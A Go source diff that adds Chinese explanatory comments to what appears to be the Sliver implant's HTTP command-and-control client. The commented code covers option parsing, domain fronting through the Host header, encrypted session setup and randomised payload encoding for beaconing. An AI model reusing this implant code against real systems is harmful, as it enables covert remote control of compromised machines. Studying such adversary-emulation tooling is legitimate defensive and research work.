@@ -56,31 +56,35 @@ const (
 )
 
 var (
-	ErrClosed               = errors.New("http session closed")
-	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
-	TimeDelta time.Duration = 0
+	ErrClosed                             = errors.New("http session closed")
+	ErrStatusCodeUnexpected               = errors.New("unexpected http response code")
+	TimeDelta               time.Duration = 0
 )
 
 // HTTPOptions - c2 specific configuration options
 type HTTPOptions struct {
-	Driver               string
+	Driver               string // 所使用的底层实现，go或者wininet
 	NetTimeout           time.Duration
 	TlsTimeout           time.Duration
-	PollTimeout          time.Duration
+	PollTimeout          time.Duration // 轮询超时时间
 	MaxErrors            int
 	ForceHTTP            bool
 	DisableAcceptHeader  bool
 	DisableUpgradeHeader bool
-	HostHeader           string
+	HostHeader           string // host头，用于域前置
 
 	ProxyConfig   string
 	ProxyUsername string
 	ProxyPassword string
-	AskProxyCreds bool
+	AskProxyCreds bool // 为true时，要求用户提供代理凭据，仅在Driver为wininet时有效
 }
 
 // ParseHTTPOptions - Parse c2 specific configuration options
+// 配置信息并不是直接按照结构体的形式来存储过来，而是将内容都构造在URI当中，然后自行解析，并初始化结构体
+// 解析时，出现不符合预期的值，直接置为默认值
 func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
+	// c2URI.Query().Get 从URI的参数当中取值
+	// time.ParseDuration 从字符串解析为Duration格式
 	netTimeout, err := time.ParseDuration(c2URI.Query().Get("net-timeout"))
 	if err != nil {
 		netTimeout = time.Duration(30 * time.Second)
@@ -93,6 +97,7 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 	if err != nil {
 		pollTimeout = time.Duration(30 * time.Second)
 	}
+	// maxErrors 最大错误次数
 	maxErrors, err := strconv.Atoi(c2URI.Query().Get("max-errors"))
 	if err != nil || maxErrors < 0 {
 		maxErrors = 10
@@ -121,9 +126,11 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 }
 
 // HTTPStartSession - Attempts to start a session with a given address
+// HTTP协议启动
 func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*SliverHTTPClient, error) {
 	var client *SliverHTTPClient
 	var err error
+	// HTTPS处理
 	if !opts.ForceHTTP {
 		client = httpsClient(address, opts)
 		client.Options = opts
@@ -133,6 +140,7 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 			return client, nil
 		}
 	}
+	// 强制使用HTTP或者HTTPS启动失败，会走HTTP的处理，默认端口80
 	if err != nil || opts.ForceHTTP {
 		// If we're using default ports then switch to 80
 		if strings.HasSuffix(address, ":443") {
@@ -157,11 +165,11 @@ type HTTPDriver interface {
 
 // SliverHTTPClient - Helper struct to keep everything together
 type SliverHTTPClient struct {
-	Origin      string
-	PathPrefix  string
-	driver      HTTPDriver
-	ProxyURL    string
-	SessionCtx  *cryptography.CipherContext
+	Origin      string                      // 上线的URL
+	PathPrefix  string                      // URI.Path
+	driver      HTTPDriver                  // 使用的底层实现
+	ProxyURL    string                      // 代理
+	SessionCtx  *cryptography.CipherContext // CipherContext
 	SessionID   string
 	pollTimeout time.Duration
 	pollCancel  context.CancelFunc
@@ -173,11 +181,13 @@ type SliverHTTPClient struct {
 
 // SessionInit - Initialize the session
 func (s *SliverHTTPClient) SessionInit() error {
+	// 随机一个32位的密钥
 	sKey := cryptography.RandomKey()
 	s.SessionCtx = cryptography.NewCipherContext(sKey)
 	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
 
+	//
 	encryptedSessionInit, err := cryptography.ECCEncryptToServer(data)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -328,7 +338,12 @@ func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, er
 
 // We do our own POST here because the server doesn't have the
 // session key yet.
+// 将构造好的加密数据包选择一种随机的编码方式进行编码
+// 构造上线URI，包括添加随机字符串、OTP等
+// 向Server发送请求包
+// Server回报后，解码、解密，拿到SessionID
 func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
+	// 随机使用一个编码方式
 	nonce, encoder := encoders.RandomEncoder()
 	payload := encoder.Encode(sessionInit)
 	reqBody := bytes.NewReader(payload)
@@ -353,12 +368,12 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 	if resp.StatusCode != http.StatusOK {
 		serverDateHeader := resp.Header.Get("Date")
 		if serverDateHeader != "" {
-				// If the request failed and there is a Date header, find the time difference and save it for the next request
-				curTime := time.Now().UTC()
-				serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
-				if err == nil {
-					TimeDelta = serverTime.UTC().Sub(curTime)
-				}
+			// If the request failed and there is a Date header, find the time difference and save it for the next request
+			curTime := time.Now().UTC()
+			serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
+			if err == nil {
+				TimeDelta = serverTime.UTC().Sub(curTime)
+			}
 		}
 		// {{if .Config.Debug}}
 		log.Printf("[http] non-200 response (%d): %v", resp.StatusCode, resp)
